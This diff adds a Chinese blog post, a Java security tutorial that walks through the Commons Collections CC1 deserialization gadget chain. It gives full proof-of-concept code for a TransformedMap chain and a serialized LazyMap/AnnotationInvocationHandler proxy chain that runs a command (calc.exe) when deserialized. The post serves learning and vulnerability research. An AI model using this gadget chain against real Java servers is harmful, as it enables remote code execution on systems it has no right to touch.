@@ -1,0 +1,686 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>yso之CC1链 | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    yso之CC1链
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-01-29 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/_1xjK2YDa/" class="post-tags">
+                            # Java安全
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h2 id="前言">前言</h2>
+<p>Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。</p>
+<p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
+<h2 id="环境">环境</h2>
+<ul>
+<li>
+<p>因为java 8u71之后已修复不可利用，所以安装了jdk7u80</p>
+</li>
+<li>
+<p>Apache-Common-Collections-3.1</p>
+</li>
+</ul>
+<h2 id="反射知识">反射知识</h2>
+<p>CC链不像URLDNS简单，需要利用到反射机制</p>
+<p>Java反射机制：是指在运行时去获取一个类的变量和方法信息。然后通过获取到的信息来创建对象，调用方法的一种机制。</p>
+<p>我们可以通过反射命令执行的简单例子来进行理解</p>
+<pre><code class="language-java"> public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        c1.getMethod(&quot;exec&quot;, String.class).invoke(c1.getMethod(&quot;getRuntime&quot;).invoke(c1), &quot;calc.exe&quot;);
+    }
+</code></pre>
+<p>这是能成功打开计算器的代码</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/4e9d373376c6de41b478cf7fbe8f51f7.png" alt="image-20220110145920930" loading="lazy"></figure>
+<p>我们可以将它拆解为正常的反射流程</p>
+<p>1.首先获取Class类对象，这里使用的是Class类中的静态方法forName</p>
+<ul>
+<li>还有常见的其他两种方法，这里不细讲
+<ul>
+<li>使用类的calss属性来获取该类对于的class对象。</li>
+<li>用对象的getClass()方法，返回该对象所属类对应的Class对象</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-java">public static void main(String[] args) throws ClassNotFoundException{
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+    }
+</code></pre>
+<p>2.然后在Class类中用getConstructor获取构造方法，然后通过newInstance获取对象</p>
+<pre><code class="language-java"> public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor con1 = c1.getConstructor();
+        Object o1 = con1.newInstance();
+    }
+</code></pre>
+<p>到这一步就已经出现问题</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Vatlf4lv-1643030725723)(http://image.liangyueliangyue.top//img202201242125349.png)]</p>
+<p>写一个Runtime步进，Runtime的构造方法为私有的</p>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/a315500f883bf563fb0494d09a052468.png" alt="image-20220110151021466" loading="lazy"></figure>
+<p>getConstructor()方法只能获取所有公共构造方法对象的数组</p>
+<p>这时候我们可以通过getDeclaredConstructor()方法来获取类的私有构造方法</p>
+<pre><code class="language-java">public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor con1 = c1.getDeclaredConstructor();
+        Object o1 = con1.newInstance();
+    }
+</code></pre>
+<p>但是能够获取到并不意味能够通过私有方法创建对象</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/63149efb652d2481c713dd4e6b393c3f.png" alt="image-20220110151759246" loading="lazy"></figure>
+<p>这里需要用到java的暴力反射</p>
+<pre><code class="language-java"> public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor con1 = c1.getDeclaredConstructor();
+        con1.setAccessible(true);
+        Object o1 = con1.newInstance();
+    }
+</code></pre>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/93d3c6efb8283fe8bb79aec5cfc4b675.png" alt="image-20220110152000677" loading="lazy"></figure>
+<p>通过setAccessible设置值为ture来取消访问检查</p>
+<p>成功执行后继续通过getMethod()获取对象的存在方法</p>
+<pre><code class="language-java">public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor con1 = c1.getDeclaredConstructor();
+        con1.setAccessible(true);
+        Object o1 = con1.newInstance();
+        Method m1 = c1.getMethod(&quot;exec&quot;, String.class);
+    }
+</code></pre>
+<p>invoke调用obj对象的成员方法</p>
+<pre><code class="language-java">public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
+        Class c1 = Class.forName(&quot;java.lang.Runtime&quot;);
+        Constructor con1 = c1.getDeclaredConstructor();
+        con1.setAccessible(true);
+        Object o1 = con1.newInstance();
+        Method m1 = c1.getMethod(&quot;exec&quot;, String.class);
+        m1.invoke(o1,&quot;calc.exe&quot;);
+    }
+</code></pre>
+<p>成功弹出计算器，但是在高版本（&gt;=jdk11）虽然能够执行但是会给出warning</p>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/8c6f8e88c86f98776c296e70598bc023.png" alt="image-20220110153142093" loading="lazy"></figure>
+<p>最回到例子来，可以看出它根本没有调用过newInstance函数，那么它invoke的对象是怎么生成的？</p>
+<pre><code class="language-java">c1.getMethod(&quot;getRuntime&quot;).invoke(c1)
+</code></pre>
+<p>Runtime类可以通过 getRuntime() 来获取到 Runtime 对象，而invoke 的作用是执行方法</p>
+<p>但是它有不同的用法</p>
+<ul>
+<li>如果这个方法是普通方法，那么第一个参数是类对象</li>
+<li>如果这个方法是静态方法，那么第一个参数是类或者用null代替</li>
+</ul>
+<p>而getRuntime() 是静态方法，所以它的参数是一个类（或是null）而不是类对象，所以不需要去生成类对象来进行调用</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/bc22576bb088776781e8b192e7d38f65.png" alt="image-20220110154933822" loading="lazy"></figure>
+<p>反射机制讲究的就是动态性，由于这种<strong>动态性</strong>，可以极大的增强程序的灵活性，程序不用在编译期就完成确定，在运行期仍然可以扩展。但也正因为如此才会被广泛的利用。</p>
+<h2 id="cc-poc复现">CC-POC复现</h2>
+<p>先用idea创建maven项目</p>
+<p>导入cc依赖</p>
+<pre><code class="language-java">   &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+</code></pre>
+<p>然后新建Poc.java</p>
+<pre><code class="language-java">import org.apache.commons.collections.*;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.util.HashMap;
+import java.util.Map;
+
+public class Poc {
+
+    public static void main(String[] args) throws Exception {
+        //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;})
+        };
+
+        //将transformers数组存入ChaniedTransformer这个继承类
+        Transformer transformerChain = new ChainedTransformer(transformers);
+
+        //创建Map并绑定transformerChina
+        Map innerMap = new HashMap();
+        innerMap.put(&quot;value&quot;, &quot;value&quot;);
+        //给予map数据转化链
+        Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+
+        //触发漏洞
+        Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
+        //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式
+        onlyElement.setValue(&quot;foobar&quot;);
+    }
+}
+</code></pre>
+<p>直接运行弹出计算器</p>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/131c9ef912636deb260990a4ecf35560.png" alt="image-20220102111819303" loading="lazy"></figure>
+<h2 id="cc-poc解析">CC-POC解析</h2>
+<h3 id="布局">布局</h3>
+<pre><code class="language-java">//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码
+        Transformer[] transformers = new Transformer[] {
+                new ConstantTransformer(Runtime.class),
+                new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }),
+                new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }),
+                new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;})
+        };
+</code></pre>
+<p>开始构建了一个Transformer的数组，而Transformer是一个接口，所以transformers是一个接口数组</p>
+<p>数组的内容是通过实现了Transformer接口的类来创建的对象</p>
+<p>首先看<strong>ConstantTransformer</strong>类</p>
+<figure data-type="image" tabindex="8"><img src="https://img-blog.csdnimg.cn/img_convert/217f5a9ed54525bb45245ae0b5abeaf8.png" alt="image-20220110160557843" loading="lazy"></figure>
+<p>使用构造方法传入参数（Runtime类对象）</p>
+<p>再来看<strong>InvokerTransformer</strong>类，从注释中就能知道这个类是拿来生成新对象的</p>
+<pre><code class="language-java">/**
+ * Transformer implementation that creates a new object instance by reflection.
+ * 
+ * @since Commons Collections 3.0
+ * @version $Revision: 1.7 $ $Date: 2004/05/26 21:44:05 $
+ *
+ * @author Stephen Colebourne
+ */
+</code></pre>
+<p>三个调用了同样的构造方法</p>
+<figure data-type="image" tabindex="9"><img src="https://img-blog.csdnimg.cn/img_convert/35a51614aaa841424431f26c063d12ad.png" alt="image-20220110161900636" loading="lazy"></figure>
+<p>iMethodName、iParamTypes、iArgs来自于构造方法</p>
+<p>第一个参数是方法名，第二个参数是参数类型，第三个是参数值，将参数提取一下</p>
+<pre><code class="language-java">&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }
+&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }
+&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}
+</code></pre>
+<p>再来看下面的</p>
+<pre><code class="language-java">Transformer transformerChain = new ChainedTransformer(transformers);
+</code></pre>
+<p>创建了<strong>ChainedTransformer</strong>，传入参数为接口数组</p>
+<figure data-type="image" tabindex="10"><img src="https://img-blog.csdnimg.cn/img_convert/bc07134b34e319516f8f1bde6d1d5a69.png" alt="image-20220110162228001" loading="lazy"></figure>
+<p>构造函数也是将接口数组赋值给iTransformers变量</p>
+<p>创建HashMap并传入一个键值对</p>
+<pre><code class="language-java">Map innerMap = new HashMap();
+innerMap.put(&quot;value&quot;, &quot;value&quot;);
+</code></pre>
+<p>再看下面</p>
+<pre><code class="language-java">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+</code></pre>
+<p>通过TransformedMap类的decorate方法得到了一个<strong>TransformedMap</strong>对象outerMap</p>
+<p>分析一下<strong>TransformedMap</strong></p>
+<figure data-type="image" tabindex="11"><img src="https://img-blog.csdnimg.cn/img_convert/28531f9a005c5e45b74d74af337dd8fe.png" alt="image-20220111121753511" loading="lazy"></figure>
+<p>存在构造方法但是是protected保护的，所以需要通过decorate提供一个实例化对象。</p>
+<p>keyTransformer传值为null，valueTransformer为transformerChain对象</p>
+<p>然后通过一系列方法获取到outerMap的第一个键值对并转换成Map.Entry形式赋值给onlyElement</p>
+<pre><code class="language-java">Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();
+</code></pre>
+<p>然后就到了关键的漏洞触发点，打上断点开始调试</p>
+<figure data-type="image" tabindex="12"><img src="https://img-blog.csdnimg.cn/img_convert/7d9b96a2f64fb3403325ea20444d21b2.png" alt="image-20220113131707777" loading="lazy"></figure>
+<p>①步入调用了parent的checkSetValue方法</p>
+<figure data-type="image" tabindex="13"><img src="https://img-blog.csdnimg.cn/img_convert/7b1e9aaddd45d380186792886727246d.png" alt="image-20220113132515831" loading="lazy"></figure>
+<p>②而这里因为onlyElement是outerMap(<strong>TransformedMap</strong>对象)entrySet获得的，所以parent是TransformedMap，从而调用了TransformedMap类中的checkSetValue方法</p>
+<figure data-type="image" tabindex="14"><img src="https://img-blog.csdnimg.cn/img_convert/c216c1243b3e50f7aedcf10fe7160d21.png" alt="image-20220113133239153" loading="lazy"></figure>
+<p>③checkSetValue又调用了<strong>valueTransformer</strong>类中的<strong>transform</strong>方法，参数为新设置的value值对象</p>
+<p>那么这个<strong>valueTransformer</strong>是什么类？</p>
+<p>crtl点击发现是一个常量</p>
+<figure data-type="image" tabindex="15"><img src="https://img-blog.csdnimg.cn/img_convert/6e4c91147da7abe2d00837ce67ff9ce0.png" alt="image-20220113133939017" loading="lazy"></figure>
+<p>那么肯定是构造时就定义好的，找到构造方法确认参数为第三个</p>
+<figure data-type="image" tabindex="16"><img src="https://img-blog.csdnimg.cn/img_convert/aada54ecf4e164424af14bbf87a99fed.png" alt="image-20220113134130957" loading="lazy"></figure>
+<p>而我们又是通过<strong>decorate</strong>方法调用构造方法</p>
+<figure data-type="image" tabindex="17"><img src="https://img-blog.csdnimg.cn/img_convert/1e9e97c4dda776c89ce930a313a04eb4.png" alt="image-20220113134236600" loading="lazy"></figure>
+<p>POC中调用decorate时传入的第三个值正是<strong>transformerChain</strong>对象（由<strong>ChainedTransformer</strong>得到）</p>
+<pre><code class="language-java">Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
+</code></pre>
+<p>所以这里调用的是<strong>ChainedTransformer</strong>类中的<strong>transform</strong>方法，再步入</p>
+<figure data-type="image" tabindex="18"><img src="https://img-blog.csdnimg.cn/img_convert/58e30d3053aa10ef4f31dc059fbd963b.png" alt="image-20220113134513750" loading="lazy"></figure>
+<p>④用for循环遍历了<strong>iTransformers</strong>，将里面的对象都调用<strong>transform</strong>方法依次返回</p>
+<p>而<strong>iTransformers</strong>值在上面对象的创建时就已经知道是接口数组</p>
+<figure data-type="image" tabindex="19"><img src="https://img-blog.csdnimg.cn/img_convert/d36ee425ba6af28954e9e0029559a1c9.png" alt="image-20220113135033315" loading="lazy"></figure>
+<p>⑤再步入，首先调用的是<strong>ConstantTransformer</strong>类的<strong>transform</strong>方法</p>
+<figure data-type="image" tabindex="20"><img src="https://img-blog.csdnimg.cn/img_convert/b8bc2778543530e04bef76330ce4dab8.png" alt="image-20220113135151118" loading="lazy"></figure>
+<p>在上面创建时也讲到了，直接是我们提供的Runtime.class（类名）</p>
+<p>⑥步入到下一次循环</p>
+<figure data-type="image" tabindex="21"><img src="https://img-blog.csdnimg.cn/img_convert/7c49531b71dd4313e082a9b368783b5a.png" alt="image-20220113135700611" loading="lazy"></figure>
+<p>这时候object已经通过<strong>ConstantTransformer</strong>类的<strong>transform</strong>方法变成了我们提供的Runtime类</p>
+<p>然后再三次调用<strong>InvokerTransformer</strong>类的<strong>transform</strong>方法，这个方法中会尝试反射</p>
+<p>通过getClass()获取类，getMethod()获取方法，invoke反射调用方法（这些都在前面基础讲过）</p>
+<p>这里的iMethodName，iParamTypes，iArgs全部在创建时定义（<strong>可控</strong>）</p>
+<h3 id="第一次反射">第一次反射</h3>
+<pre><code class="language-java">&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }
+</code></pre>
+<p>此时的input为Runtime类对象</p>
+<p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-S7UC2b4E-1643030725743)(http://image.liangyueliangyue.top//img202201242125370.png)]</p>
+<p>调用input.getClass() =&gt; Runtime.class.getClass()得到了java.lang.Class类，获取我们传入的getMethod方法</p>
+<p>调用了Runtime<strong>类</strong>对象中getMethod的方法，参数为&quot;getRuntime&quot;, new Class[0]</p>
+<p>那么最终返回的就是<strong>Runtime</strong>类中的getRuntime方法了</p>
+<h3 id="第二次反射">第二次反射</h3>
+<pre><code class="language-java">&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }
+</code></pre>
+<p>此时的input为getRuntime方法对象</p>
+<figure data-type="image" tabindex="22"><img src="https://img-blog.csdnimg.cn/img_convert/787e3d3026c5ff2476acbf58cc8e302c.png" alt="image-20220113150713938" loading="lazy"></figure>
+<p>调用input.getClass() 得到了java.lang.reflect.Method类,获取我们传入的invoke方法</p>
+<p>调用了getRuntime<strong>方法</strong>对象中invoke的方法，参数为null, new Object[0]</p>
+<p>那么最终返回的就是<strong>getRuntime</strong>方法对象执行invoke参数为null</p>
+<p>上面讲到过当invoke调用静态方法时需要令第一个参数为类或者null，所以这里只是为了调用静态方法getRuntime</p>
+<p>那么最终返回的就是Runtime对象了</p>
+<h3 id="第三次反射">第三次反射</h3>
+<pre><code class="language-java">&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}
+</code></pre>
+<p>此时的input为Runtime对象</p>
+<figure data-type="image" tabindex="23"><img src="https://img-blog.csdnimg.cn/img_convert/9904ae0f869b8db78bd5cae9a75491bf.png" alt="image-20220113155051356" loading="lazy"></figure>
+<p>调用input.getClass() 得到了java.lang.Runtime类,获取我们传入的exec方法</p>
+<p>调用了Runtime对象中exec的方法，参数为calc.exe，成功弹出计算器</p>
+<figure data-type="image" tabindex="24"><img src="https://img-blog.csdnimg.cn/img_convert/fa9fb4f9be13d9aed250859b460dc6ff.png" alt="image-20220113155335542" loading="lazy"></figure>
+<p>到这里就完成了这个POC的分析</p>
+<h3 id="疑问">疑问</h3>
+<p>为什么不直接利用反射命令执行，而是构造一个transformers 数组通过Runtime.class去不断反射执行</p>
+<blockquote>
+<p>因为Java 要能完成序列化与反序列化要求这个被序列化的类有继承Serializable，而Runtime类没有继承，所以直接使用就会报错。</p>
+<p>而<code>Runtime.class</code>是属于<code>java.lang.Class</code> ，<code>java.lang.Class</code> 是实现了<code>java.io.Serializable</code> 接⼝的。可以被序列化。</p>
+</blockquote>
+<h3 id="利用链">利用链</h3>
+<p>最后的调用栈简化</p>
+<blockquote>
+<p>Map.Entry-&gt;setValue()</p>
+<p>TransformedMap-&gt;checkSetValue()</p>
+<p>ChainedTransformer-&gt;transform()</p>
+<p>InvokerTransformer-&gt;transform()</p>
+</blockquote>
+<h2 id="yso的cc1分析">yso的CC1分析</h2>
+<p>在实际运用中需要将代码转换为序列化流然后再让服务器成功readObject读取我们序列化的流文件完成反序列化最终命令执行。</p>
+<p>所以根据yso的CC1链去学习实际运用的特殊情况以及利用方法</p>
+<p>首先是利用链和环境需求</p>
+<pre><code class="language-java">/*
+	Gadget chain:
+		ObjectInputStream.readObject()
+			AnnotationInvocationHandler.readObject()
+				Map(Proxy).entrySet()
+					AnnotationInvocationHandler.invoke()
+						LazyMap.get()
+							ChainedTransformer.transform()
+								ConstantTransformer.transform()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Class.getMethod()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.getRuntime()
+								InvokerTransformer.transform()
+									Method.invoke()
+										Runtime.exec()
+
+	Requires:
+		commons-collections
+ */
+</code></pre>
+<p>可以看到后面的利用是一样的，只是前面多了很多步,反着推</p>
+<p>首先看LazyMap类的get方法，这里他取代了TransformedMap，那么它肯定有办法去调用指定类的transform方法</p>
+<figure data-type="image" tabindex="25"><img src="https://img-blog.csdnimg.cn/img_convert/ec270cc7ba47b5689528de62a538dae5.png" alt="image-20220113202825445" loading="lazy"></figure>
+<p>来到get函数，首先判断是否该Map是否已经存在key，没有的话就调用<code>factory.transform()</code>进行处理</p>
+<p>而factory又是常量，那么肯定在构造函数中定义</p>
+<figure data-type="image" tabindex="26"><img src="https://img-blog.csdnimg.cn/img_convert/30ec1ddd5065e14b9f7c294fe9474378.png" alt="image-20220113203051781" loading="lazy"></figure>
+<p>而构造函数是protected，提供了decorate方法来创建对象</p>
+<figure data-type="image" tabindex="27"><img src="https://img-blog.csdnimg.cn/img_convert/29d2c662d27056441fa05d6ac1af886e.png" alt="image-20220113203526294" loading="lazy"></figure>
+<p>这里第二个decorate方法是符合我们的要求的（factory是实现Transformer接口的类）</p>
+<p>那么万事俱备只欠东风，我们要去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的<code>get(Object)</code>方法。</p>
+<p>而<code>sun.reflect.annotation.AnnotationInvocationHandler</code> 的 <code>invoke()</code>方法满足条件</p>
+<figure data-type="image" tabindex="28"><img src="https://img-blog.csdnimg.cn/img_convert/bbbaa5b8b1a6caa5b4b0ee073c197fa8.png" alt="image-20220113220125138" loading="lazy"></figure>
+<p>在<code>invoke()</code>中，判断var2方法的形参个数为0且<code>var2</code>的方法名（var=var2.getName()）不为<code>toString</code>,<code>hashCode</code>或者<code>annotationType</code>则会触发<code>this.memberValues.get()</code></p>
+<p>在找到<code>this.memberValues</code>的赋值点</p>
+<figure data-type="image" tabindex="29"><img src="https://img-blog.csdnimg.cn/img_convert/5a8d45b58c29ac528afa6bed5f3c7266.png" alt="image-20220113220935389" loading="lazy"></figure>
+<p>构造方法中的var2构造为LazyMap即可触发漏洞，那么接下来找谁能够调用触发<code>AnnotationInvocationHandler.invoke()</code></p>
+<p>也就是入口处的AnnotationInvocationHandler类的重写后的readObject</p>
+<figure data-type="image" tabindex="30"><img src="https://img-blog.csdnimg.cn/img_convert/0090b109d56c79562ed2d13727a74726.png" alt="image-20220113224819820" loading="lazy"></figure>
+<p>readObject中调用了this.memberValues的entrySet方法。跟invoke方法有什么关系？</p>
+<p>这里用到了java的动态代理知识点</p>
+<blockquote>
+<p>简单的说就是执行代理对象任何方法都会先触发代理对象对应handler的invoke方法。</p>
+</blockquote>
+<p>如果这里的memberValues是个代理对象，那么就会调用memberValues对应handler的invoke方法</p>
+<p>所以我们设置一个代理对象，然后将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。</p>
+<h3 id="动态代理执行invoke">动态代理执行invoke</h3>
+<p>①在调用readObject反序列化处理时，会触发AnnotationInvocationHandler重写后的readObject方法</p>
+<p>②然后调用了<code>this.memberValues.entrySet</code>，而<code>this.memberValues</code>是之前构造好的代理对象，所以调用其方法时，会去调用其创建代理时设置的handler的invoke方法。</p>
+<p>③而这个代理对象设置的handler为这个InvocationHandler这个类产生的对象，接着会调用他的invoke方法</p>
+<p>④InvocationHandler的invoke方法中调用了<code>this.memberValues#get</code>，此时的<code>this.memberValues</code>为之前设置好的lazymap，所以这里调用的是<code>lazymap#get</code></p>
+<p>然后就是之前分析的调用链，就这样自己本地实现一下简单的序列化反序列化</p>
+<h3 id="本地实现">本地实现</h3>
+<pre><code class="language-java">public static void main(String[] args) throws Exception {
+        //布局
+        Transformer[] transformers = new Transformer[]{ new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc.exe&quot;}})};
+
+        //利用ChainedTransformer链接
+        ChainedTransformer TransformerChain = new ChainedTransformer(transformers);
+        
+    	//LazyMap中get存在transform入口
+    	Map hashMap = new HashMap();
+        Map lazyMap = LazyMap.decorate(hashMap, TransformerChain);
+    
+        //因为sun.reflect.annotation.AnnotationInvocationHandler的构造方法不是public, 要通过反射构造出来。
+    	//赋值this.memberValues为lazyMap(也就是代理对象为lazyMap)，且var1满足条件才能触发触发this.memberValues.get()
+        Constructor con1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        con1.setAccessible(true);
+        InvocationHandler ih = (InvocationHandler) con1.newInstance(Override.class, lazyMap);
+
+        //最后一步就是创建动态代理，传入InvocationHandler，反序列化时会调用memberValues的entrySet方法，会首先触发InvocationHandler的invoke方法
+        Object proxy = Proxy.newProxyInstance(ih.getClass().getClassLoader(), new Class[]{Map.class}, ih);
+      	Constructor con2 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class);
+        con2.setAccessible(true);
+        Object ih2 = con2.newInstance(Override.class, proxy);
+
+        //序列化和反序列化
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;exp&quot;));
+        oos.writeObject(ih2);
+        oos.flush();
+        oos.close();
+
+        FileInputStream fis = new FileInputStream(&quot;exp&quot;);
+        ObjectInputStream ois = new ObjectInputStream(fis);
+        // readObject触发
+        Object newObj = ois.readObject();
+        ois.close();
+    }
+</code></pre>
+<p><strong>还有一个点没有说，就是var1满足的条件</strong></p>
+<p>来到AnnotationInvocationHandler类的构造方法，第⼀个参数是⼀个Annotation类类型参数，第二个是map类型参数。</p>
+<figure data-type="image" tabindex="31"><img src="https://img-blog.csdnimg.cn/img_convert/81173a184d5a70e52cb2222058c3135c.png" alt="image-20220114141352717" loading="lazy"></figure>
+<p>存在if判断，不满足不会赋值且报错</p>
+<p><strong>isAnnotation()方法</strong>用于检查此Class对象是否表示注释类型。</p>
